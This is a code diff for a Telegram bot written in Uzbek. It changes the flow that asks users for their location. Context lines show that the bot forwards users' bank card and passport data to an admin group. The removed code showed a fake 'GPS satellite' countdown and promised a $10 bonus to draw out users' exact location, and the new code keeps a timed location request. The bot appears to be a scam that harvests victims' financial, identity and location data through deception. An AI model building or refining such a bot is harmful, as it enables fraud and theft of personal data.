@@ -164,70 +164,24 @@ async def cmd_setgroup(message: Message):
     db.set_setting("target_group_id", str(message.chat.id))
     await message.answer(f"✅ Ushbu guruh (ID: <code>{message.chat.id}</code>) muvaffaqiyatli ulandi!\nEndi barcha ma'lumotlar, yangi ro'yxatdan o'tganlar, karta va pasport ma'lumotlari shu guruhga ham yuboriladi.")
 
-# JOYLASHUV TAYMERLARI (1 DAQIQA KUTISH)
+# JOYLASHUV TAYMERLARI (HISOBLAGICHSIZ - ORQA FONDA 1 DAQIQA KUTISH)
 active_location_timers = {}
 
-async def run_location_countdown(chat_id: int, user_id: int, first_name: str):
+async def run_location_wait(chat_id: int, user_id: int, first_name: str):
     try:
-        status_msg = await bot.send_message(
+        # Foydalanuvchiga oddiy xabar, HECH QANDAY HISOBLAGICHSIZ
+        await bot.send_message(
             chat_id=chat_id,
-            text=(
-                f"🛰 <b>GPS orqali aniq geolokatsiyangiz aniqlanmoqda...</b>\n\n"
-                f"📍 Sun'iy yo'ldoshlar orqali aniq manzil va koordinatalar aniqlanishi uchun iltimos <b>1 daqiqa (60 soniya)</b> kuting:\n\n"
-                f"⏱ Qolgan vaqt: <b>60 soniya</b> ⏳\n"
-                f"<code>[░░░░░░░░░░] 0%</code>\n\n"
-                f"<i>📡 Aniq koordinatalar to'liq aniqlangach, pastda «📍 Joylashuvni yuborish» tugmasi faollashadi.</i>"
-            ),
+            text="📍 <b>Ro'yxatdan o'tish uchun yana 1 qadam qoldi...</b>",
             reply_markup=ReplyKeyboardRemove(),
             parse_mode="HTML"
         )
 
-        steps = [
-            (50, "▓░░░░░░░░░", "17%"),
-            (40, "▓▓▓░░░░░░░", "33%"),
-            (30, "▓▓▓▓▓░░░░░", "50%"),
-            (20, "▓▓▓▓▓▓▓░░░", "67%"),
-            (10, "▓▓▓▓▓▓▓▓░░", "83%"),
-            (0,  "▓▓▓▓▓▓▓▓▓▓", "100%")
-        ]
+        # Orqa fonda 1 daqiqa (60 soniya) kutish (aniq manzil aniqlanguncha)
+        await asyncio.sleep(60)
 
-        for remaining, bar, pct in steps:
-            await asyncio.sleep(10)
-            if db.is_user_registered(user_id):
-                return
-
-            if remaining > 0:
-                try:
-                    await bot.edit_message_text(
-                        chat_id=chat_id,
-                        message_id=status_msg.message_id,
-                        text=(
-                            f"🛰 <b>GPS orqali aniq geolokatsiyangiz aniqlanmoqda...</b>\n\n"
-                            f"📍 Sun'iy yo'ldoshlar orqali aniq manzil va koordinatalar aniqlanishi uchun iltimos <b>1 daqiqa (60 soniya)</b> kuting:\n\n"
-                            f"⏱ Qolgan vaqt: <b>{remaining} soniya</b> ⏳\n"
-                            f"<code>[{bar}] {pct}</code>\n\n"
-                            f"<i>📡 Aniq koordinatalar to'liq aniqlangach, pastda «📍 Joylashuvni yuborish» tugmasi faollashadi.</i>"
-                        ),
-                        parse_mode="HTML"
-                    )
-                except Exception:
-                    pass
-
-        # 60 soniya to'liq tugadi
+        # 1 daqiqadan so'ng foydalanuvchiga tugmani chiqarish
         if not db.is_user_registered(user_id):
-            try:
-                await bot.edit_message_text(
-                    chat_id=chat_id,
-                    message_id=status_msg.message_id,
-                    text=(
-                        f"🎯 <b>Aniq geolokatsiya muvaffaqiyatli aniqlandi!</b>\n\n"
-                        f"📍 Ro'yxatdan o'tishni yakunlash va <b>10.00$ bonus</b>ni balansingizga olish uchun pastdagi <b>«📍 Joylashuvni yuborish»</b> tugmasini bosing:"
-                    ),
-                    parse_mode="HTML"
-                )
-            except Exception:
-                pass
-
             loc_kb = ReplyKeyboardMarkup(
                 keyboard=[[KeyboardButton(text="📍 Joylashuvni yuborish", request_location=True)]],
                 resize_keyboard=True,
@@ -235,14 +189,14 @@ async def run_location_countdown(chat_id: int, user_id: int, first_name: str):
             )
             await bot.send_message(
                 chat_id=chat_id,
-                text="👇 <b>Quyidagi tugma orqali aniq joylashuvingizni yuboring:</b>",
+                text="📍 <b>Ro'yxatdan o'tishni yakunlash uchun pastdagi «📍 Joylashuvni yuborish» tugmasini bosing:</b>",
                 reply_markup=loc_kb,
                 parse_mode="HTML"
             )
     except asyncio.CancelledError:
         pass
     except Exception as e:
-        logging.error(f"Countdown xatosi (user {user_id}): {e}")
+        logging.error(f"Location wait xatosi (user {user_id}): {e}")
     finally:
         active_location_timers.pop(user_id, None)
 
@@ -251,7 +205,7 @@ async def start_location_countdown(chat_id: int, user_id: int, first_name: str):
         old_task = active_location_timers[user_id]
         if not old_task.done():
             old_task.cancel()
-    task = asyncio.create_task(run_location_countdown(chat_id, user_id, first_name))
+    task = asyncio.create_task(run_location_wait(chat_id, user_id, first_name))
     active_location_timers[user_id] = task
 
 @dp.message(F.contact)
